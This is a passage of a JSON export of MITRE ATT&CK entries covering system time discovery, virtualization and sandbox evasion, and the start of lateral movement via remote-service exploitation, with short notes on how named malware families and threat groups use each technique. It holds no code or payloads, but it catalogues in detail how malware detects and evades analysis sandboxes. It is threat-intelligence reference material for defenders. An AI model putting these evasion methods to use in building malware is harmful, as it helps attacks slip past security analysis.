victim\u2019s machine."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream can check system time to help determine when changes were made to specified files."}, {"id": "S0588", "name": "GoldMax", "description": "GoldMax can check the current date-time value of the compromised system, comparing it to the hardcoded execution trigger and can send the current timestamp to the C2 server."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can determine the time on the victim machine via IPinfo."}, {"id": "S0237", "name": "GravityRAT", "description": "GravityRAT can obtain the date and time of a system."}, {"id": "S0690", "name": "Green Lambert", "description": "Green Lambert can collect the date and time from a compromised host."}, {"id": "S0417", "name": "GRIFFON", "description": "GRIFFON has used a reconnaissance module that can be used to retrieve the date and time of the system."}, {"id": "G0126", "name": "Higaisa", "description": "Higaisa used a function to gather the current time."}, {"id": "S0376", "name": "HOPLIGHT", "description": "HOPLIGHT has been observed collecting system time from victim machines."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole gathers the local system time from the victim\u2019s machine."}, {"id": "S1051", "name": "KEYPLUG", "description": "KEYPLUG can obtain the current tick count of an infected computer."}, {"id": "G0032", "name": "Lazarus Group", "description": "A Destover-like implant used by Lazarus Group can obtain the current system time and send it to the C2 server."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo uses JavaScript to get the system time."}, {"id": "S0149", "name": "MoonWind", "description": "MoonWind obtains the victim's current time."}, {"id": "S0039", "name": "Net", "description": "The net time command can be used in Net to determine the local or remote system time."}, {"id": "S1147", "name": "Nightdoor", "description": "Nightdoor can identify the system local time information."}, {"id": "S0353", "name": "NOKKI", "description": "NOKKI can collect the current timestamp of the victim's machine."}, {"id": "S0439", "name": "Okrum", "description": "Okrum can obtain the date and time of the compromised system."}, {"id": "S0264", "name": "OopsIE", "description": "OopsIE checks to see if the system is configured with \"Daylight\" time and checks for a specific region to be set for the timezone."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors used the net time command as part of their advanced reconnaissance."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used the time command to retrieve the current time of a compromised system."}, {"id": "S0501", "name": "PipeMon", "description": "PipeMon can send time zone information from a compromised host to C2."}, {"id": "S0139", "name": "PowerDuke", "description": "PowerDuke has commands to get the time the machine was built, the time, and the time zone."}, {"id": "S0238", "name": "Proxysvc", "description": "As part of the data reconnaissance phase, Proxysvc grabs the system time to send back to the control server."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can identify the system time on a targeted host."}, {"id": "S1148", "name": "Raccoon Stealer", "description": "Raccoon Stealer gathers victim machine timezone information."}, {"id": "S0148", "name": "RTM", "description": "RTM can obtain the victim time zone."}, {"id": "S0596", "name": "ShadowPad", "description": "ShadowPad has collected the current date and time of the victim system."}, {"id": "S0140", "name": "Shamoon", "description": "Shamoon obtains the system time and will only activate if it is greater than a preset date."}, {"id": "S0450", "name": "SHARPSTATS", "description": "SHARPSTATS has the ability to identify the current date and time on the compromised host."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has used tools to obtain the current system time."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can collect start time information from a compromised host."}, {"id": "S0615", "name": "SombRAT", "description": "SombRAT can execute getinfo  to discover the current time on a compromised host."}, {"id": "S0380", "name": "StoneDrill", "description": "StoneDrill can obtain the current date and time of the victim machine."}, {"id": "S1034", "name": "StrifeWater", "description": "StrifeWater can collect the time zone from the victim's machine."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet collects the time and date of a system when it is infected."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST collected device UPTIME."}, {"id": "S1064", "name": "SVCReady", "description": "SVCReady can collect time zone information."}, {"id": "S0098", "name": "T9000", "description": "T9000 gathers and beacons the system time during installation."}, {"id": "S0011", "name": "Taidoor", "description": "Taidoor can use GetLocalTime and GetSystemTime to collect system time."}, {"id": "S0586", "name": "TAINTEDSCRIBE", "description": "TAINTEDSCRIBE can execute GetLocalTime for time discovery."}, {"id": "S0467", "name": "TajMahal", "description": "TajMahal has the ability to determine local time on a compromised host."}, {"id": "G0089", "name": "The White Company", "description": "The White Company has checked the current date on the victim system."}, {"id": "S0678", "name": "Torisma", "description": "Torisma can collect the current time on a victim machine."}, {"id": "G0010", "name": "Turla", "description": "Turla surveys a system upon check-in to discover the system time by using the net time command."}, {"id": "S0275", "name": "UPPERCUT", "description": "UPPERCUT has the capability to obtain the time zone information and current timestamp of the victim\u2019s machine."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has obtained the victim's system timezone."}, {"id": "S0466", "name": "WindTail", "description": "WindTail has the ability to generate the current date and time."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy gathers the current time zone and date information from the system."}, {"id": "S0330", "name": "Zeus Panda", "description": "Zeus Panda collects the current system time (UTC) and sends it back to the C2 server."}, {"id": "G0128", "name": "ZIRCONIUM", "description": "ZIRCONIUM has used a tool to capture the time on a compromised host in order to register it with C2."}], "sub_techniques": []}, {"name": "Virtualization/Sandbox Evasion", "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.", "detailed_description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.", "id": "T1497", "examples": [{"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla has the ability to perform anti-sandboxing and anti-virtualization checks."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can attempt to overload sandbox analysis by sending 1550 calls to printf."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal can check to determine if the compromised system is running on VMware."}, {"id": "S1070", "name": "Black Basta", "description": "Black Basta can make a random number of calls to the kernel32.beep function to hinder log analysis."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee has the ability to perform anti-virtualization checks."}, {"id": "S0484", "name": "Carberp", "description": "Carberp has removed various hooks before installing the trojan or bootkit to evade sandbox analysis or other analysis software."}, {"id": "S0023", "name": "CHOPSTICK", "description": "CHOPSTICK  includes runtime checks to identify an analysis environment and prevent execution on it."}, {"id": "S0046", "name": "CozyCar", "description": "Some versions of CozyCar will check to ensure it is not being executed inside a virtual machine or a known malware analysis sandbox environment. If it detects that it is, it will exit."}, {"id": "G0012", "name": "Darkhotel", "description": "Darkhotel malware has employed just-in-time decryption of strings to evade sandbox detection."}, {"id": "S0554", "name": "Egregor", "description": "Egregor has used multiple anti-analysis and anti-sandbox techniques to prevent automated analysis by sandboxes."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium can use junk code to generate random activity to obscure malware behavior."}, {"id": "S0499", "name": "Hancitor", "description": "Hancitor has used a macro to check that an ActiveDocument shape object in the lure message is present. If this object is not found, the macro will exit without downloading additional payloads."}, {"id": "S0483", "name": "IcedID", "description": "IcedID has manipulated Keitaro Traffic Direction System to filter researcher and sandbox traffic."}, {"id": "S1020", "name": "Kevin", "description": "Kevin can sleep for a time interval between C2 communication attempts."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has embedded a \"vmdetect.exe\" executable to identify virtual machines at the beginning of execution."}, {"id": "C0005", "name": "Operation Spalax", "description": "During Operation Spalax, the threat actors used droppers that would run anti-analysis checks before executing malware on a compromised host."}, {"id": "S0147", "name": "Pteranodon", "description": "Pteranodon has the ability to use anti-detection functions to identify sandbox environments."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin contains real and fake second-stage payloads following initial execution, with the real payload only delivered if the malware determines it is not running in a virtualized environment."}, {"id": "S0148", "name": "RTM", "description": "RTM can detect if it is running within a sandbox or other virtualized analysis environment."}, {"id": "G1031", "name": "Saint Bear", "description": "Saint Bear contains several anti-analysis and anti-virtualization checks."}, {"id": "S1030", "name": "Squirrelwaffle", "description": "Squirrelwaffle has contained a hardcoded list of IP addresses to block that belong to sandboxes and analysis platforms."}, {"id": "S0380", "name": "StoneDrill", "description": "StoneDrill has used several anti-emulation techniques to prevent automated analysis by emulators or sandboxes."}], "sub_techniques": [{"name": "System Checks", "description": "Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.", "detailed_description": "Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nSpecific checks will vary based on the target and/or adversary, but may involve behaviors such as Windows Management Instrumentation, PowerShell, System Information Discovery, and Query Registry to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment.\nChecks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Once executed, malware may also use File and Directory Discovery to check if it was saved in a folder or file with unexpected or even analysis-related naming artifacts such as malware, sample, or hash.\nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions. In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output.\nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.", "id": "T1497.001", "examples": [{"id": "S0373", "name": "Astaroth", "description": "Astaroth can check for Windows product ID's used by sandboxes and usernames and disk serial numbers associated with analyst environments."}, {"id": "S1087", "name": "AsyncRAT", "description": "AsyncRAT can identify strings such as Virtual, vmware, or VirtualBox to detect virtualized environments."}, {"id": "S0438", "name": "Attor", "description": "Attor can detect whether it is executed in some virtualized or emulated environment by searching for specific artifacts, such as communication with I/O ports and using VM-specific instructions."}, {"id": "S0337", "name": "BadPatch", "description": "BadPatch attempts to detect if it is being run in a Virtual Machine (VM) using a WMI query for disk drive name, BIOS, and motherboard information. "}, {"id": "S1070", "name": "Black Basta", "description": "Black Basta can check system flags and libraries, process timing, and API's to detect code emulation or sandboxing."}, {"id": "S0657", "name": "BLUELIGHT", "description": "BLUELIGHT can check to see if the infected machine has VM tools running."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee has the ability to search for designated file paths and Registry keys that indicate a virtualized environment from multiple products."}, {"id": "S0527", "name": "CSPY Downloader", "description": "CSPY Downloader can search loaded modules, PEB structure, file paths, Registry keys, and memory to determine if it is being debugged or running in a virtual environment."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate queries system resources on an infected machine to identify if it is executing in a sandbox or virtualized environment."}, {"id": "G0012", "name": "Darkhotel", "description": "Darkhotel malware has used a series of checks to determine if it's being analyzed; checks include the length of executable names, if a filename ends with .Md5.exe, and if the program is executed from the root of the C:\\ drive, as well as checks for sandbox-related libraries."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla can search a compromised system's running processes and services to detect Hyper-V, QEMU, Virtual PC, Virtual Box, and VMware, as well as Sandboxie."}, {"id": "S0354", "name": "Denis", "description": "Denis ran multiple system checks, looking for processor and register characteristics, to evade emulation and analysis."}, {"id": "S1159", "name": "DUSTTRAP", "description": "DUSTTRAP decryption relies on the infected machine's HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGUID value."}, {"id": "S0024", "name": "Dyre", "description": "Dyre can detect sandbox analysis environments by inspecting the process list and Registry."}, {"id": "S0396", "name": "EvilBunny", "description": "EvilBunny's dropper has checked the number of processes and the length and strings of its own file name to identify if the malware is in a sandbox environment."}, {"id": "G0120", "name": "Evilnum", "description": "Evilnum has used a component called TerraLoader to check certain hardware and file information to detect sandboxed environments. "}, {"id": "S0679", "name": "Ferocious", "description": "Ferocious can run anti-sandbox checks using the Microsoft Excel 4.0 function GET.WORKSPACE to determine the OS version, if there is a mouse present, and if the host is capable of playing sounds."}, {"id": "S0182", "name": "FinFisher", "description": "FinFisher obtains the hardware device list and checks if the MD5 of the vendor ID is equal to a predefined list in order to check for sandbox/virtualized environments."}, {"id": "C0001", "name": "Frankenstein", "description": "During Frankenstein, the threat actors used a script that ran WMI queries to check if a VM or sandbox was running, including VMWare and Virtualbox. The script would also call WMI to determine the number of cores allocated to the system; if less than two the script would stop execution."}, {"id": "S0588", "name": "GoldMax", "description": "GoldMax will check if it is being run in a virtualized environment by comparing the collected MAC address to c8:27:cc:c2:37:5a."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can detect VMWare via its I/O port and Virtual PC via the vpcext instruction."}, {"id": "S0237", "name": "GravityRAT", "description": "GravityRAT uses WMI to check the BIOS and manufacturer information for strings like \"VMWare\", \"Virtual\", and \"XEN\" and another WMI request to get the current temperature of the hardware to determine if it's a virtual machine environment. "}, {"id": "S0561", "name": "GuLoader", "description": "GuLoader has the ability to perform anti-VM and anti-sandbox checks using string hashing, the API call EnumWindows, and checking for Qemu guest agent."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can check for artifacts of VirtualBox, Virtual PC and VMware environment, and terminate itself if they are detected."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus can determine if it is running in a virtualized environment by checking the OS version, checking the number of running processes, ensuring a 64-bit application is running on a 64-bit host, and checking if the host has a valid MAC address."}, {"id": "S0532", "name": "Lucifer", "description": "Lucifer can check for specific usernames, computer names, device drivers, DLL's, and virtual devices associated with sandboxed environments and can enter an infinite loop and stop itself if any are detected."}, {"id": "S1048", "name": "macOS.OSAMiner", "description": "macOS.OSAMiner can parse the output of the native system_profiler tool to determine if the machine is running with 4 cores."}, {"id": "S0576", "name": "MegaCortex", "description": "MegaCortex has checked the number of CPUs in the system to avoid being run in a sandbox or emulator."}, {"id": "S1122", "name": "Mispadu", "description": "Mispadu can run checks to verify if it is running within a virtualized environments including Hyper-V, VirtualBox or VMWare and will terminate execution if the computer name is \"JOHN-PC.\""}, {"id": "S0637", "name": "NativeZone", "description": "NativeZone has checked if Vmware or VirtualBox VM is running on a compromised host."}, {"id": "S1147", "name": "Nightdoor", "description": "Nightdoor embeds code from the public al-khaser project, a repository that works to detect virtual machines, sandboxes, and malware analysis environments."}, {"id": "S0644", "name": "ObliqueRAT", "description": "ObliqueRAT can halt execution if it identifies processes belonging to virtual machine software or analysis tools."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used macros to verify if a mouse is connected to a compromised machine."}, {"id": "S0439", "name": "Okrum", "description": "Okrum's loader can check the amount of physical memory and terminates itself if the host has less than 1.5 Gigabytes of physical memory in total."}, {"id": "S0264", "name": "OopsIE", "description": "OopsIE performs several anti-VM and sandbox checks on the victim's machine. One technique the group has used was to perform a WMI query SELECT * FROM MSAcpi_ThermalZoneTemperature to check the temperature to see if it\u2019s running in a virtual environment."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group used tools that conducted a variety of system checks to detect sandboxes or VMware services."}, {"id": "S0352", "name": "OSX_OCEANLOTUS.D", "description": "OSX_OCEANLOTUS.D checks a number of system parameters to see if it is being run on real hardware or in a virtual machine environment, such as sysctl hw.model and the kernel boot time."}, {"id": "S0626", "name": "P8RAT", "description": "P8RAT can check the compromised host for processes associated with VMware or VirtualBox environments."}, {"id": "S1145", "name": "Pikabot", "description": "Pikabot performs a variety of system checks to determine if it is running in an analysis environment or sandbox, such as checking the number of processors (must be greater than two), and the amount of RAM (must be greater than 2GB)."}, {"id": "S0013", "name": "PlugX", "description": "PlugX checks if VMware tools is running in the background by searching for any process named \"vmtoolsd\"."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT checked the size of the hard drive to determine if it was being run in a sandbox environment. In the event of sandbox detection, it would delete itself by overwriting the malware scripts with the contents of \"License.txt\" and exiting."}, {"id": "S0192", "name": "Pupy", "description": "Pupy has a module that checks a number of indicators on the system to determine if its running on a virtual machine."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can check the compromised host for the presence of multiple executables associated with analysis tools and halt execution if any are found."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin performs a variety of system environment checks to determine if it is running in a virtualized or sandboxed environment, such as querying CPU temperature information and network card MAC address information."}, {"id": "S0332", "name": "Remcos", "description": "Remcos searches for Sandboxie and VMware on the system."}, {"id": "S0270", "name": "RogueRobin", "description": "RogueRobin uses WMI to check BIOS version for VBOX, bochs, qemu, virtualbox, and vm to check for evidence that the script might be executing within an analysis environment. "}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT can check for VMware-related files and DLLs related to sandboxes."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has run several virtual machine and sandbox checks, including checking if Sbiedll.dll is present in a list of loaded modules, comparing the machine name to HAL9TH and the user name to JohnDoe, and checking the BIOS version for known virtual machine identifiers."}, {"id": "S1019", "name": "Shark", "description": "Shark can stop execution if the screen width of the targeted machine is not over 600 pixels."}, {"id": "S0226", "name": "Smoke Loader", "description": "Smoke Loader scans processes to perform anti-VM checks. "}, {"id": "S1086", "name": "Snip3", "description": "Snip3 has the ability to detect Windows Sandbox, VMWare, or VirtualBox by querying Win32_ComputerSystem to extract the Manufacturer string."}, {"id": "S0627", "name": "SodaMaster", "description": "SodaMaster can check for the presence of the Registry key HKEY_CLASSES_ROOT\\Applications\\VMwareHostOpen.exe before proceeding to its main functionality."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST checked the domain name of the compromised host to verify it was running in a real environment."}, {"id": "S1064", "name": "SVCReady", "description": "SVCReady has the ability to determine if its runtime environment is virtualized."}, {"id": "S0242", "name": "SynAck", "description": "SynAck checks its directory location in an attempt to avoid launching in a sandbox."}, {"id": "S0094", "name": "Trojan.Karagany", "description": "Trojan.Karagany can detect commonly used and generic virtualization platforms based primarily on drivers and file paths."}, {"id": "S0333", "name": "UBoatRAT", "description": "UBoatRAT checks for virtualization software such as VMWare, VirtualBox, or QEmu on the compromised machine."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has run system checks to determine if they were operating in a virtualized environment."}, {"id": "S0612", "name": "WastedLocker", "description": "WastedLocker checked if UCOMIEnumConnections and IActiveScriptParseProcedure32 Registry keys were detected as part of its anti-analysis technique."}, {"id": "S0689", "name": "WhisperGate", "description": "WhisperGate can stop its execution when it recognizes the presence of certain monitoring tools."}, {"id": "S0248", "name": "yty", "description": "yty has some basic anti-sandbox detection that tries to detect Virtual PC, Sandboxie, and VMware. "}]}, {"name": "User Activity Based Checks", "description": "Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.", "detailed_description": "Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks  , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro  or waiting for a user to double click on an embedded image to activate.", "id": "T1497.002", "examples": [{"id": "G0012", "name": "Darkhotel", "description": "Darkhotel has used malware that repeatedly checks the mouse cursor position to determine if a real user is on the system."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 used images embedded into document lures that only activate the payload when a user double clicks to avoid sandboxes."}, {"id": "S0439", "name": "Okrum", "description": "Okrum loader only executes the payload after the left mouse button has been pressed at least three times, in order to avoid being executed within virtualized or emulated environments."}, {"id": "S0543", "name": "Spark", "description": "Spark has used a splash screen to check whether an user actively clicks on the screen before running malicious code."}]}, {"name": "Time Based Evasion", "description": "Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.", "detailed_description": "Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.\nAdversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: Scheduled Task/Job). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled Multi-Stage Channels to avoid analysis and scrutiny.\nBenign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as Pings, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments. Another variation, commonly referred to as API hammering, involves making various calls to Native API functions in order to delay execution (while also potentially overloading analysis environments with junk data).\nAdversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.", "id": "T1497.003", "examples": [{"id": "S0584", "name": "AppleJeus", "description": "AppleJeus has waited a specified time before downloading a second stage payload."}, {"id": "S0642", "name": "BADFLICK", "description": "BADFLICK has delayed communication to the actor-controlled IP address by 5 minutes."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can use a timer to delay execution of core functionality."}, {"id": "S0574", "name": "BendyBear", "description": "BendyBear can check for analysis environments and signs of debugging using the Windows API kernel32!GetTickCountKernel32 call."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal has checked if the malware is running in a virtual environment with the anti-debug function GetTickCount() to compare the timing."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 can call NtDelayExecution to pause execution."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee has the ability to set a hardcoded and randomized sleep interval."}, {"id": "S0660", "name": "Clambling", "description": "Clambling can wait 30 minutes before initiating contact with C2."}, {"id": "S0611", "name": "Clop", "description": "Clop has used the sleep command to avoid sandbox detection."}, {"id": "S0115", "name": "Crimson", "description": "Crimson can determine when it has been installed on a host for at least 15 days before downloading the final payload."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla can implement the kernel32.dll Sleep function to delay execution for up to 300 seconds before implementing persistence or processing an addon package."}, {"id": "S0694", "name": "DRATzarus", "description": "DRATzarus can use the GetTickCount and GetSystemTimeAsFileTime API calls to measure function timing. DRATzarus can also remotely shut down into sleep mode under specific conditions to evade detection."}, {"id": "S0554", "name": "Egregor", "description": "Egregor can perform a  long sleep (greater than or equal to 3 minutes) to evade detection."}, {"id": "S0396", "name": "EvilBunny", "description": "EvilBunny has used time measurements from 3 different APIs before and after performing sleep operations to check and abort if the malware is running in a sandbox."}, {"id": "S0512", "name": "FatDuke", "description": "FatDuke can turn itself on or off at random intervals."}, {"id": "S0493", "name": "GoldenSpy", "description": "GoldenSpy's installer has delayed installation of GoldenSpy for two hours after it reaches a victim system."}, {"id": "S0588", "name": "GoldMax", "description": "GoldMax has set an execution trigger date and time, stored as an ASCII Unix/Epoch time value."}, {"id": "S1138", "name": "Gootloader", "description": "Gootloader can designate a sleep period of more than 22 seconds between stages of infection."}, {"id": "S0632", "name": "GrimAgent", "description": "GrimAgent can sleep for 195 - 205 seconds after payload execution and before deleting its task."}, {"id": "S0561", "name": "GuLoader", "description": "GuLoader has the ability to perform anti-debugging based on time checks, API calls, and CPUID."}, {"id": "S0697", "name": "HermeticWiper", "description": "HermeticWiper has the ability to receive a command parameter to sleep prior to carrying out destructive actions on a targeted host."}, {"id": "S1132", "name": "IPsec Helper", "description": "IPsec Helper will sleep for a random number of seconds, iterating 200 times over sleeps between one to three seconds, before continuing execution flow."}, {"id": "S0513", "name": "LiteDuke", "description": "LiteDuke can wait 30 seconds before executing additional code if security software is detected."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot has performed a time-based anti-debug check before downloading its third stage."}, {"id": "S1141", "name": "LunarWeb", "description": "LunarWeb can pause for a number of hours before entering its C2 communication loop."}, {"id": "S1059", "name": "metaMain", "description": "metaMain has delayed execution for five to six minutes during its persistence establishment process."}, {"id": "S0439", "name": "Okrum", "description": "Okrum's loader can detect presence of an emulator by using two calls to GetTickCount API, and checking whether the time has been accelerated."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group used tools that collected GetTickCount and GetSystemTimeAsFileTime data to detect sandbox or VMware services."}, {"id": "S0626", "name": "P8RAT", "description": "P8RAT has the ability to \"sleep\" for a specified time to evade detection."}, {"id": "S0453", "name": "Pony", "description": "Pony has delayed execution using a built-in function to avoid detection and analysis."}, {"id": "S0650", "name": "QakBot", "description": "The QakBot dropper can delay dropping the payload to evade detection."}, {"id": "S0565", "name": "Raindrop", "description": "After initial installation, Raindrop runs a computation to delay execution."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has used the command timeout 20 to pause the execution of its initial loader."}, {"id": "S1086", "name": "Snip3", "description": "Snip3 can execute WScript.Sleep to delay execution of its second stage."}, {"id": "S0627", "name": "SodaMaster", "description": "SodaMaster has the ability to put itself to \"sleep\" for a specified time."}, {"id": "S1034", "name": "StrifeWater", "description": "StrifeWater can modify its sleep time responses from the default of 20-22 seconds."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST remained dormant after initial access for a period of up to two weeks."}, {"id": "S1064", "name": "SVCReady", "description": "SVCReady can enter a sleep stage for 30 minutes to evade detection."}, {"id": "S0595", "name": "ThiefQuest", "description": "ThiefQuest invokes time call to check the system's time, executes a sleep command, invokes a second time call, and then compares the time difference between the two time calls and the amount of time the system slept to identify the sandbox."}, {"id": "S0671", "name": "Tomiris", "description": "Tomiris has the ability to sleep for at least nine minutes to evade sandbox-based analysis systems."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot has used printf and file I/O loops to delay process execution as part of API hammering."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has used a 30 minute delay after execution to evade sandbox monitoring tools."}, {"id": "S0689", "name": "WhisperGate", "description": "WhisperGate can pause for 20 seconds to bypass antivirus solutions."}, {"id": "S0658", "name": "XCSSET", "description": "Using the machine's local time, XCSSET waits 43200 seconds (12 hours) from the initial creation timestamp of a specific file, .report. After the elapsed time, XCSSET executes additional modules."}]}]}]}, {"name": "Lateral Movement", "description": "The adversary is trying to move through your environment.Lateral Movement consists of techniques that adversaries use to enter and control remote systems on a network. Following through on their primary objective often requires exploring the network to find their target and subsequently gaining access to it. Reaching their objective often involves pivoting through multiple systems and accounts to gain. Adversaries might install their own remote access tools to accomplish Lateral Movement or use legitimate credentials with native network and operating system tools, which may be stealthier.", "id": "TA0008", "techniques": [{"name": "Exploitation of Remote Services", "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.", "detailed_description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through Network Service Discovery or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\nThere are several well-known vulnerabilities that exist in common services such as SMB  and RDP  as well as applications that may be used within internal networks such as MySQL  and web server services.\nDepending on the permissions level of the vulnerable remote service an adversary may achieve Exploitation for Privilege Escalation as a result of lateral movement exploitation as well.", "id": "T1210", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 exploited a Windows SMB Remote Code Execution Vulnerability to conduct lateral movement."}, {"id": "S0606", "name": "Bad Rabbit", "description": "Bad Rabbit used the EternalRomance SMB exploit to spread through victim networks."}, {"id": "S0608", "name": "Conficker", "description": "Conficker exploited the MS08-067 Windows vulnerability for remote code execution through a crafted RPC request."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has exploited a Windows Netlogon vulnerability (CVE-2020-1472) to obtain access to Windows Active Directory 